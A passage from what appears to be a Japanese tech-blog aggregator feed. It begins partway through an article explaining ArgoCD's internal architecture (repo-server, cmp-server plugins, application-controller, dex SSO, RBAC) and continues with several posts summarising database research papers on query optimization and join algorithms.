foo  name: baz-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: baz-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/baz-chart.gitDeclarative Setup - Argo CD - Declarative GitOps CD for Kubernetes(3) repo-serverのよるクローン取得とポーリングrepo-serverは、認証情報を使用して、リポジトリにgit cloneコマンドを実行します。取得したクローンを、/tmp/_argocd-repoディレクトリ配下にUUIDの名前で保管します。また、リポジトリの変更をポーリングし、変更を検知した場合はgit fetchコマンドを実行します。# クローンが保管されていることを確認できる$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/_argocd-repo/<URLに基づくUUID>\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yamlcustom repo-server - where is the local cache kept? \xb7 argoproj argo-cd \xb7 Discussion #9889 \xb7 GitHub▶ repo-serverでのクローン保管先のバージョン差異について2.3以前では、repo-serverは/tmpディレクトリ配下にURLに基づく名前でクローンを保管します。$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/https___github.com_hiroki-hasegawa_foo-repository\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yaml(4) repo-serverによるサイドカーコールrepo-serverは、自身にマウントされたいくつかのマニフェスト管理ツール (例：Helm、Kustomize) を実行する機能を持っています。しかし、実行できないツールではサイドカー (cmp-server) をコールします。この時、Applicationの.spec.source.pluginキーでプラグイン名を指定すると、そのApplicationではサイドカーをコールします。逆を言えば、プラグイン名を指定していないApplicationは、サイドカーをコールしない です。apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: foo-application  namespace: foospec:  source:    plugin:      name: helm-secrets # このプラグイン名は、ConfigManagementPluginのmetadata.nameキーに設定したもの  ...このコールは、Volume上のUnixドメインソケットを経由します。Unixドメインソケットのエンドポイントの実体は.sockファイルです。$ kubectl exec -it argocd-repo-server -c foo-plugin-cmp-server\\\\    -- bash -c \\"ls /home/argocd/cmp-server/plugins/\\"foo-plugin.sock▶ UnixソケットドメインについてASCII.jp：Unixドメインソケット (1/2)(5) repo-serverによる暗号化キーと暗号化変数の取得cmp-serverは、暗号化キー (例：AWS KMS、Google CKMなど) を使用してSecretストア (例：AWS SecretManager、Google SecretManager、SOPS、Vaultなど) の暗号化変数を復号化します。▶ クラウドプロバイダーの暗号化キーを使用するために必要な証明書について/etc/sslディレクトリ (ディレクトリはOSによって異なる) に証明書が無く、cmp-serverがHTTPSプロトコルを使用できない可能性があります。その場合は、お好きな方法で証明書をインストールし、コンテナにマウントするようにしてください\uD83D\uDC4DapiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  ...    # サイドカーのcmp-server    - name: helm-secrets-cmp-server      image: ubuntu:latest      ...      volumeMounts:        # サイドカーがAWS KMSを使用する時にHTTPSリクエストを送信する必要があるため、証明書をマウントする        - name: certificate          mountPath: /etc/ssl  ...  initContainers:    - name: certificate-installer      image: ubuntu:latest      command:        - /bin/sh        - -c      args:        - |          apt-get update -y          # ルート証明書をインストールする          apt-get install -y ca-certificates          # 証明書を更新する          update-ca-certificates      volumeMounts:        - mountPath: /etc/ssl          name: certificate  volumes:    - name: certificate      emptyDir: {}(6) サイドカーによるプラグイン処理の取得cmp-serverは、マニフェスト管理ツールのプラグイン (helm-secrets、argocd-vault-pluginなど) を実行します。この時マニフェストの作成時のプラグインとして、ConfigMap配下のConfigManagementPluginでプラグインの処理を定義します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、プラグインとしてhelm-secretsを採用し、helm secrets templateコマンドの実行を定義します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmp-cm  namespace: foodata:  helm-secrets-plugin.yaml: |    apiVersion: argoproj.io/v1alpha1    kind: ConfigManagementPlugin    metadata:      namespace: foo      name: helm-secrets # このプラグイン名は、Applicationのspec.source.pluginキーで指定したもの    spec:      generate:        command:          - /bin/bash          - -c        args:          - |            set -o pipefail            helm secrets template -f $ARGOCD_ENV_SECRETS -f $ARGOCD_ENV_VALUES -n $ARGOCD_APP_NAMESPACE $ARGOCD_APP_NAME .  foo-plugin.yaml: |    ...▶ ConfigManagementPluginのファイル名について(7) サイドカーによるプラグイン処理の実行cmp-serverはプラグインを実行し、Secretを含むマニフェストを作成します。ConfigMap配下のファイルをplugin.yamlの名前でサイドカーにマウントする必要があります。また、先ほどのUnixドメインソケットの.sockファイルや、 cmp-serverがプラグインを実行するための各バイナリファイルもマウントが必要です。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、helm-secretsプラグインを実行するサイドカー (helm-secrets-cmp-server) を作成します。apiVersion: v1kind: Podmetadata:  name: argocd-repo-serverspec:  containers:    # repo-server    - name: repo-server      image: quay.io/argoproj/argocd:latest    ...    # helm-secretsのcmp-server    - name: helm-secrets-cmp-server      # コンテナイメージは軽量にする      image: ubuntu:latest      command:        - /var/run/argocd/argocd-cmp-server      env:        # helmプラグインの場所を設定する        - name: HELM_PLUGINS          value: /helm-working-dir/plugins      securityContext:        runAsNonRoot: true        runAsUser: 999      volumeMounts:        # リポジトリのクローンをコンテナにマウントする        - name: tmp          mountPath: /tmp        # ConfigManagementPluginのマニフェスト (helm-secrets.yaml) を \\"plugin.yaml\\" の名前でコンテナにマウントする        - name: argocd-cmp-cm          mountPath: /home/argocd/cmp-server/config/plugin.yaml          subPath: helm-secrets.yaml        # コンテナ間で通信するためのUnixドメインソケットファイルをコンテナにマウントする        - name: plugins          mountPath: /home/argocd/cmp-server/plugins        # 任意のツールのバイナリファイルをコンテナにマウントする        - name: custom-tools          mountPath: /usr/local/bin        # helmプラグインのバイナリをコンテナにマウントする        - name: helm-working-dir          mountPath: /helm-working-dir/plugins      ...  # Podの共有ボリューム  volumes:    # リポジトリのクローンを含む    - name: tmp      emptyDir: {}    # Helmなどの任意のツールを含む    - name: custom-tools      emptyDir: {}    # helmプラグインを含む    - name: helm-working-dir      emptyDir: {}▶ マウント時のConfigManagementPluginのファイル名についてv2.6では、ConfigManagementPluginのマニフェストを/home/argocd/cmp-server/configディレクトリに、plugin.yamlの名前でマウントしないといけません。これは、cmp-serverの起動コマンド (/var/run/argocd/argocd-cmp-server) がplugin.yamlの名前しか扱えないためです。ArgoCD公式の見解で、サイドカーでは単一のプラグインしか実行できないように設計しているとのコメントがありました。今後のアップグレードで改善される可能性がありますが、v2.6では、ConfigManagementPluginの数だけcmp-serverが必要になってしまいます\uD83D\uDE47\uD83C\uDFFB‍use multiple plugins in sidecar installation method \xb7 argoproj argo-cd \xb7 Discussion #12278 \xb7 GitHub▶ Kustomizeのプラグインをどのコンテナで実行するかについて▶ クラウドプロバイダーのSecretストアを採用する場合についてHow to Manage Kubernetes Secrets with GitOps for Secure Deployments - Akuity Blog04. application-controller、redis-serverapplication-controllerとはコアドメインレイヤーにあるapplication-controllerです。Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。redis-serverとはインフラレイヤーにあるredis-serverです。application-controllerの処理結果のキャッシュを保管します。仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンドArgoCD用Clusterの管理者は、ClusterにArgoCD系のカスタムリソース (例：Application、AppProjectなど)　をデプロイします。▶ ArgoCD自体のデプロイにargo-helmを採用する場合についてGitHub - argoproj/argo-helm: ArgoProj Helm ChartsただしHelmの重要な仕様として、チャートの更新時に使用するhelm upgradeコマンドは、CRDを作成できる一方でこれを変更できません。HelmでCRDを作成するとHelmの管理ラベルが挿入されてしまうため、作成の時点からCRDがHelmの管理外となるように、kubectlコマンドでCRDを作成した方がよいです\uD83D\uDC4D$ kubectl diff -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"$ kubectl apply -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"ArgoCD上でHelmを使用してデプロイする場合はこの仕様を気にしなくてよいのかな、と思った方がいるかもしれないです。ですが本記事で解説した通り、ArgoCDはcmp-serverのhelm templateコマンド (この時、--include-crdsオプションが有効になっている) や、application-controllerのkubectl applyコマンドを組み合わせてマニフェストをデプロイしているため、CRDもちゃんと更新してくれます\uD83D\uDC4D\uD83C\uDFFB️Helm | Custom Resource Definitions(2) application-controllerによるArgoCD系カスタムリソースのReconciliationkube-controller-managerは、application-controllerを操作し、Reconciliationを実施します。application-controllerは、Etcd上に永続化されたマニフェストと同じ状態のArgoCD系カスタムリソースを作成/変更します。▶ カスタムコントローラーでもあるapplication-controllerについてHow Operators work in Kubernetes | Red Hat Developer(3) application-controllerによるマニフェスト取得application-controllerは、repo-serverからリポジトリのマニフェストを取得します。取得したマニフェストは、repo-serverのサイドカーであるcmp-serverが作成したものです。(4) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。application-controllerには、gitops-engineパッケージが内蔵されており、これはヘルスチェックからデプロイまでの基本的な処理を実行します。▶ gitops-engineパッケージについてv0.7.0 では以下のディレクトリからなります\uD83D\uDC47\uD83D\uDC31 gitops-engine/├── \uD83D\uDCC2 pkg│    ├── cache│    ├── diff   # リポジトリとClusterの間のマニフェストの差分を検出する。ArgoCDのDiff機能に相当する。│    ├── engine # 他のパッケージを使い、GitOpsの一連の処理を実行する。│    ├── health # Clusterのステータスをチェックする。ArgoCDのヘルスチェック機能に相当する。│    ├── sync   # Clusterにマニフェストをデプロイする。ArgoCDのSync機能に相当する。│    └── utils  # 他のパッケージに汎用的な関数を提供する。│...gitops-engine/specs/design-top-down.md at v0.7.0 \xb7 argoproj/gitops-engine \xb7 GitHub(5) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、repo-serverから取得したマニフェストの差分を検出します。ここで、kubectl diffコマンドの実行が自動化されています。(6) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。redis-serverは、Applicationやリポジトリのコミットの単位で、application-controllerの処理結果を保管しています。$ kubectl exec -it argocd-redis-server \\\\    -n foo \\\\    -- sh -c \\"redis-cli --raw\\"127.0.0.1:6379> keys *...app|resources-tree|<Application名>|<キャッシュバージョン>cluster|info|<プロダクト用ClusterのURL>|<キャッシュバージョン>git-refs|<マニフェスト/チャートリポジトリのURL>|<キャッシュバージョン>mfst|app.kubernetes.io/instance|<Application名>|<最新のコミットハッシュ値>|<デプロイ先Namespace>|*****|<キャッシュバージョン>...(7) application-controllerによるマニフェストデプロイapplication-controllerは、Applicationの操作に応じて、Clusterにマニフェストをデプロイします。ここで、kubectl applyコマンドの実行が自動化されています。▶ application-controllerがマニフェストを操作した証拠についてmetadata.managedFieldsキーがあり、何がそのマニフェストを作成/変更したのかを確認できます。実際にマニフェストを確認してみると、確かにapplication-controllerがマニフェストを作成/変更してくれたことを確認できます。apiVersion: apps/v1kind: Deploymentmetadata:  managedFields:    # ArgoCDのapplication-controllerによる管理    - manager: argocd-application-controller      apiVersion: apps/v1      # kube-apiserverに対するリクエスト内容      operation: Update      time: \\"2022-01-01T16:00:00.000Z\\"      # ArgoCDのapplication-controllerが管理するマニフェストのキー部分      fields: ...️Server-Side Apply | Kubernetes05. dex-serverdex-serverとはインフラレイヤーにあるdex-serverです。SSO (例：OAuth 2.0、SAML、OIDC) を採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダー (例：GitHub、Keycloak、AWS Cognito、Google Authなど) に送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。GitHub - dexidp/dex: OpenID Connect (OIDC) identity and OAuth 2.0 provider with pluggable connectors▶ dex-serverの必要性について2.0、SAML) を使用する場合は、dex-serverを採用する必要があります\uD83D\uDC4D️Overview - Argo CD - Declarative GitOps CD for Kubernetes仕組み(1) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(2) IDプロバイダーへの認証フェーズ委譲argocd-serverは、認証フェーズをIDプロバイダーに委譲するために、dex-serverをコールします。▶ 認証フェーズの委譲についてAuthentication and Authorization - Argo CD - Declarative GitOps CD for Kubernetes(3) dex-serverによる認可リクエスト作成dex-serverは、認可リクエストを作成します。認可リクエストに必要な情報は、ConfigMap (argocd-cm) で設定しておく必要があります。argocd-cmのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、IDプロバイダーをGitHubとし、認可リクエストに必要なクライアントIDとクライアントシークレットを設定しています。apiVersion: v1kind: ConfigMapmetadata:  namespace: foo  name: argocd-cmdata:  dex.config: |    connectors:      - type: github        id: github        name: GitHub SSO        config:          clientID: *****          clientSecret: *****        # dex-serverが認可レスポンスによるリダイレクトを受信するURLを設定する        redirectURI: https://example.com/api/dex/callback▶ dex-serverの設定についてdex.configキー配下の設定方法は、dexのドキュメントをみるとよいです\uD83D\uDC4DAuthentication Through GitHub |(4) dex-serverによる認可リクエスト送信dex-serverは、前の手順で作成した認可リクエストをIDプロバイダーに送信します。(5) IDプロバイダーによる認証フェーズ実施IDプロバイダー側でSSOの認証フェーズを実施します。IDプロバイダーは、コールバックURL (<ArgoCDのドメイン名>/api/dex/callback) を指定して、認可レスポンスを送信します。認可レスポンスはリダイレクトを発生させ、argocd-serverを介して、再びdex-serverに届きます。この後、dex-serverはIDプロバイダーのトークンエンドポイントにリクエストを送信し、またIDプロバイダーからトークン (アクセストークン、IDトークンなど) やユーザー情報を取得します。ただ、SSOの種類によって仕組みが異なるため、詳細は省略します。▶ dex-serverのコールバックURLについてDeveloper settingsタブ でSSOを設定する必要があり、この時にAuthorization callback URLという設定箇所があるはずです\uD83D\uDC4D\uD83C\uDFFB(6) argocd-serverによる認可フェーズ実施argocd-serverは、AuthZで認可フェーズを実施します。ConfigMap (argocd-rbac-cm) を参照し、IDプロバイダーから取得したユーザーやグループに、ArgoCD系カスタムリソースに関する認可スコープを付与します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、developerロールにはdevというAppProjectに属するArgoCD系カスタムリソースにのみ、またmaintainerロールには全てのAppProjectの操作を許可しています。またこれらのロールを、IDプロバイダーで認証されたグループに紐づけています。特定のArgoCD系カスタムリソースのみへのアクセスを許可すれば、結果として特定のClusterへのデプロイのみを許可したことになります\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  policy.default: role:developer  policy.csv: |    p, role:developer, *, *, dev/*/*, allow    p, role:maintainer, *, *, dev/*/*, allow    p, role:maintainer, *, *, prd/*/*, allow    g, developers, role:developer    g, maintainers, role:maintainer  scopes: \\"[groups]\\"▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetes06. argocd-server (argocd-apiserver)argocd-serverとは最後に、インフラレイヤーにあるargocd-serverです。『argocd-apiserver』とも呼ばれます。みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能し、他のコンポーネントと通信します\uD83E\uDD84仕組み(1) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。(2) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、ポーリング対象のリポジトリのマニフェストの差分を検出します。(3) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(4) application-controllerによる処理結果取得argocd-serverは、redis-serverから処理結果を取得します。(5) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(6) IngressコントローラーによるルーティングIngressコントローラーは、Ingressのルーティングルールを参照し、argocd-serverにルーティングします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。(8) IDプロバイダーによる認証フェーズ実施IDプロバイダー上で認証フェーズが完了します。argocd-serverは、ConfigMap (argocd-rbac-cm) を参照し、プロダクト用Cluster管理者に認可スコープを付与します。(9) argocd-serverによる認可フェーズ実施argocd-serverは、認可スコープに応じて、プロダクト用Cluster管理者がApplicationを操作可能にします。▶ NamespacedスコープモードについてapiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:  # 設定してはダメ  # application.namespaces: \\"*\\" # 全てのNamespaceを許可する。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: dev-foo-project  namespace: foospec:  # 設定してはダメ  # sourceNamespaces:  #  - \\"foo\\"これらにより、fooのNamespaceに属するArgoCDは、他のNamespaceにはアクセスできなくなります\uD83D\uDC4DInstallation - Argo CD - Declarative GitOps CD for Kubernetes(10) application-controllerによるマニフェストデプロイプロダクト用Cluster管理者は、ダッシュボード (argocd-server) を使用して、ClusterにマニフェストをSyncします。この時、Applicationを介してapplication-controllerを操作し、マニフェストをデプロイします。図では、App Of Appsパターンを採用したと仮定しています\uD83D\uDC68‍\uD83D\uDC69‍\uD83D\uDC67‍\uD83D\uDC66▶ App Of Appsパターンについて07. アーキテクチャのまとめ今までの全ての情報をざっくり整理して簡略化すると、ArgoCDは以下の仕組みでマニフェストをデプロイすることになります\uD83D\uDC4708. おわりにArgoCDによるデプロイの仕組みの仕組みをもりもり布教しました。ArgoCDは、UIが使いやすく、仕組みの詳細を知らずとも比較的簡単に運用できるため、ユーザーフレンドリーなツールだと思っています。もしArgoCDを使わずにマニフェストをデプロイしている方は、ArgoCDの採用をハイパー・ウルトラ・アルティメットおすすめします\uD83D\uDC4D謝辞ArgoCDの設計にあたり、以下の方に有益なプラクティスをご教授いただきました。@yaml_villager さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-05-02T05:42:57.000Z","dateMiliSeconds":1683006177000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"現代のクエリオプティマイザの基礎となる技術をまとめた論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/15_query_optimization_overview","contentSnippet":"この記事の趣旨1998年に発表されたクエリオプティマイザの基礎としてとくに重要な手法をまとめた論文を読みました。An Overview of Query Optimization in Relational Systems著者についてSurajit Chaudhuriによる論文Microsoft所属の研究者でRDBMSの研究を行なっており、近年ではCloudにおけるDBMSの研究を行なっている。概要RDBMSが提案された1970年代からクエリ最適化は大規模で幅の広く研究が行なわれてきた。この論文では執筆当時(1998年)までの重要な研究の基礎を説明している。手法探索空間統計情報とコストの推定列挙アルゴリズムアルゴリズムについて説明している。論文内では拡張可能なオプティマイザとして、StarburstとVolcano/Cascadeの2種類のオプティマイザの詳細を論じている。最新(当時)の最適化リアライズドビューについて説明している。作業時間read31:4031:40author33:402:00summary52:5519:15感想ベクトル化やパラレルジョインで扱われていたVolcanoオプティマイザの端に触れることが出来ました。内容としては基礎的な内容が多いものの、知らない概念もいくつかあり引用している論文も読みたいです。クエリ最適化の基礎を学ぶのに非常にいい内容でした。","isoDate":"2023-05-02T01:54:29.000Z","dateMiliSeconds":1682992469000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSとクライアント間におけるデータ転送を最適化する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/14_data_transfer_between_server_and_client","contentSnippet":"この記事の趣旨2017年に出版されたリモートDBMSとクライアント間の大量データ転送を最適化する手法を提案する論文を読みました。Don’t Hold My Data Hostage – A Case For Client Protocol Redesign著者についてMark Raasveldt、Hannes Muhleisenらのグループによる論文。いずれもCentrum Wiskunde & Informaticaの所属で、DuckDBのCxO。DBMSと分析システムにおけるパフォーマンス最適化を研究している。問題意識DBMSからクライアントプログラムに大量のデータを転送することは一般的なタスクである。例えばRやPythonなどを用いた分析システムはしばしばデータベース・インターフェースを利用してデータの取得を行なっている。一方でネットワーク越しにデータを転送することはレイテンシを増加させ、転送時間を長引かせる要因である。そのため分析用途で大量のデータ転送を避け、一部のデータをサンプルとして利用するに止まることが多い。このアプローチはパフォーマンスの低下を押さえられるものの、分析や機械学習の精度を下げることに繋がる。とくに既存のクライアントではネットワークによるレイテンシとスループットの制限に大きな影響を受けパフォーマンスを劣化させる。この問題はデータベースが別マシンやクラウドで動作するときにより大きな問題となる。手法本論文では既存のシリアライズ手法と圧縮手法によるパフォーマンスへの影響を計測し、新しいプロトコルとして以下の特性を持つ手法を提案している。1. チャンク毎のデータ転送と(デ)シリアライゼーション1. ヒューリスティックによる圧縮方法の決定1. text/binaryによるカスタムシリアライゼーションを使用する1. NULL終端によるテキストの取り扱い実験結果提案手法を実装したMonetDB(表内ではMonetDB++)とPostgreSQL(表内ではPostgreSQL++)を既存のDBMSやnetcatと比較することで評価を行なっている。TCP-Hのlineitem、American Community Survay、Airline On-Time Statisticsの3つのデータセットで評価を行なったところ、ローカル通信における非圧縮netcatを除き殆どのケースでMonetDB++系が最良のパフォーマンスを発揮し次点でPostgreSQL++系が優れた結果を残している。Table 10Table 11Table 12PostgreSQLに比べMonetDBが優れている理由はPostgreSQLの行指向データを列指向に変換するコストのためである。作業時間read31:2131:21author35:384:17summary70:1334:35感想論文出版時にはTPC/IPプロトコルが前提でQuic登場前のため、ネットワークプロトコル自体は考慮されていない。現在であればTPC/IPとQuicに適合した手法の比較が行なわれると思うので気になるところ。","isoDate":"2023-05-01T03:34:18.000Z","dateMiliSeconds":1682912058000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"SQL ServerにおけるUDF最適化の論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/13_sql_server_udf_optimization","contentSnippet":"この記事の趣旨2017年に発表されたSQL ServerでUDFを最適化しているFroidという手法についての論文を読みました。Froid: Optimization of Imperative Programs in a Relational Database著者についてKarthik Ramachandra、Kwanghyun Park、K. Venkatesh Emani、Alan Halverson、Cesar Galindo-Legaria、Conor Cunninghamのグループによる論文。ほとんどの著者はMicrosoftに所属しており、いずれもトランザクショナルワークロードでのRDBMSの最適化や分析ワークロードにおけるRDBMS最適化の研究をしている。問題意識RDBMSではSQLによるデータ処理アプローチと、UDFやストアドプロシージャなどによる命令型のデータ処理アプローチを提供している。SQLによるデータアクセスは高度に最適化されてきた一方で、命令型のデータ処理は非効率なため性能を阻害し利用を禁止している組織すらある。UDFによるデータアクセスは非効率であるものの、SQLに比べ下記のような利点を提供するため幅広く利用されているのも事実である。1. SQL間でコードの再利用方法を提供する1. 複雑なビジネスロジックやMLアルゴリズムなどSQLでは難しい表現を可能にする1. 単純なSQLの組み合わせのため、ユーザーの意図が明確に表現できるこれらのメリットを享受するためにRDBMSにおける命令型データアクセス手法のパフォーマンスを向上しする必要があった。手法提案手法であるFroidはMicrosoft SQL Serverにおける命令型コードのパフォーマンス向上の手法として、UDFを複雑なサブクエリとしてみなすアプローチを取っている。UDFを構成する命令はDECLARE、SELECT、IF/ELSE、RETURN、他のUDF、リレーショナルオペレーションの6つに分ることができる。提案手法ではこれらの命令を一般的なT-SQLに置き換え、Apply演算により一つの関係式に結合する方法で実現している。Table 1命令が一般SQLに置き換えられることでUDFに対して、SQLに用いられていた高度な最適化を導入することが出来る。また提案手法ではい以下の理由から、SQLとして命令を置換するときにクエリ最適化時に行なうのではなくバインド時に置換をしている。1. 実際のワークロードでの実験ではほぼ全てのケースでバインド時のほうが性能がよかった1. クエリオプティマイザの変更が不要1. バインディング時に特定の最適化を行なえるとくにクエリオプティマイザの変更はSQL Serverが商用データベースなため重要であった。作業時間read28:5028:50author32:103:20summary57:0024:50","isoDate":"2023-04-28T02:29:05.000Z","dateMiliSeconds":1682648945000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSの歴史とNewSQL","link":"https://zenn.dev/nnaka2992/articles/history_of_db_and_newsql","contentSnippet":"この記事はDBMSの登場以前から現代のDBMSを取り巻く環境までを振り返ることで、なぜNewSQLが必要とされ登場したのかをまとめます。 おことわり筆者はあくまでDBMSユーザーであり、研究者ではないため内容は個人の見解です。また対象読者はある程度DBMSに関わりがあり、OLTPやOLAP、列指向や行指向といった基本的な単語を理解しているものとします。またNewSQLの技術的詳細はスコープ外とします。 DBMS以前データベースという言葉は1950年代に米軍が情報基地を集約したことに由来します。一方で学術的なデータベースの起源はW. C. McGeeが1959年に発表...","isoDate":"2023-04-26T14:28:19.000Z","dateMiliSeconds":1682519299000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"中間結果が莫大になるときの結合を最適化する最悪ケース最適化結合をRDBMSに適応する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/12_worst_case_optimal_join","contentSnippet":"この記事の趣旨2018年に発表された分析ワークロードなどで発生しがちな最終結果に比べ、非常に大きな中間結果を作成してしまうクエリを多方向結合で最適化する論文を読みました。Adopting Worst-Case Optimal Joins in Relational Database Systems著者についてMichael Freitag、Maximilian Bandle、Tobias Schmidt、Alfons Kemper、Thomas Neumannによるグループの論文いずれの著者もDBMSにおける最適化を中心に研究しており、それぞれ分析ワークロードにおける最適化や最新のハードウェアにおける最適化などを研究している。問題意識従来のRDBMSにおける結合処理のほとんどはバイナリ結合に依存して複数のリレーションにまたがるクエリを処理してきた。数十年に渡る研究によりバイナリ結合は幅広い柔軟性と優れた性能を発揮するようになった。その一方でバイナリ結合による実行計画は特定のワークロードでは最適ではないケースを示すことが知られている。主な原因として実際のクエリ結果に比べて非常に大きな中間結果を生成するためである。とくにPK以外のキーによる結合が多くなる分析ワークロードではそのような状態を避けることが難しく、またグラフ分析のようなクエリパターンでも多く見られる。近年の論理的な進歩により中間結果の列挙を避ける多方向結合のアルゴリズムが開発可能になった。この手法はバイナリ結合計画より優れた実行時間を保証できるため、RDBMSの堅牢性を大幅に向上させる可能性を持っている。しかし現状最悪ケース最適化結合アルゴリズムでは以下のような問題を抱えている。1. 膨大なストレージとメンテナンスを必要とする結合に参加出来るカラムを含むインデックスを必要とする。1. RDBMSは挿入と更新のサポートが必要なものの、既存のアルゴリズムは高価な事前計算を必要とする。そのため本論文は以下の制約を満たすアプローチを提案している1. 多方向結合が有益な場合のみ多方向結合を使用するオプティマイザを必要とする。1. 実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。手法提案手法では比較ベースではなくハッシュベースの結合のため、2の「実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。」という要素の考慮を除いている。またオプティマイザについては既存のコストベースのものを拡張し適応している。提案手法では潜在的に成長している結合のカスケードを最悪の場合の最適結合に置き換えることで、最適化されたバイナリ結合計画を洗練させるヒューリスティックなアプローチを提案している。通常の結合順序最適化で使用されるのと同じカーディナリティ推定値に基づいて、中間テーブルが膨大になる結合を特定する。作業時間read22:1322:13author25:483:35summary52:5826:50感想とても難しい内容に感じてしまい、殆ど頭を通りすぎてしまった気がする。今まで最適化は触れずに来たため、理解が浅い領域だった。よくよく考えるとDBMSの話しに最適化が登場するのはあたりまえなので、今後はその方面にも触れて行きたい。","isoDate":"2023-04-26T02:06:46.000Z","dateMiliSeconds":1682474806000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"マルチコアメインメモリにおけるソートジョインとハッシュジョインのパフォーマンスを検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/11_join_performance_comparison","contentSnippet":"この記事の趣旨2013年に発表された\\"Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited\\"という論文を読みました。当時最新のアルゴリズムとハードウェアにおける、ソートとハッシュによる結合のパフォーマンスを比べた論文です。Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited著者についてCagri Balkesen、Gustavo Alonso、Jens Teubner、M. Tamer Ozsuらのグループによる論文いずれもDBMSにおけるクエリ最適化やビッグデータにおけるパフォーマンスを研究している。またGustavo Alonsoはハードウェアや分散システムもメインのフィールドとしている。問題意識DBMSにおいて常にソートマージとハッシュ結合の性能比較が行われており、最新の研究ではSIMDやNUMAへの適正に基づいてソートマージがより優れていると結論づけられていた。しかしこれらの分野は常に研究が重ねられ、過去の検証時には登場していなったハッシュ結合の最適化手法が生れた。この論文ではそれらを適用し再度ソートマージとハッシュ結合の性能比較を行なう。手法本論文では以下に分けて結合手法の評価を行なっている。1. ソートフェーズの評価SIMDソートアルゴリズムとC++のSTLソートアルゴリズムを比較している。マージフェーズの評価入力サイズの調整によるマージフェーズの最適化パーマンスを検証している。ソートマージジョインにおける影響要因の特定結果結合対象のデータサイズに拘わらずハッシュによる結合がソートベースの結合のパフォーマンスを上回っている。Figure 14ソートマージによる結合は入力サイズが著しく大きくなったときのみハッシュ結合のパフォーマンスに近づく。Figure 15ソートマージ、ハッシュ結合におけるデータの偏りはパフォーマンスに大きな影響を及ぼさなかった。Figure 16いずれのアルゴリズムも物理的なコア数では線形にスケールした。Figure 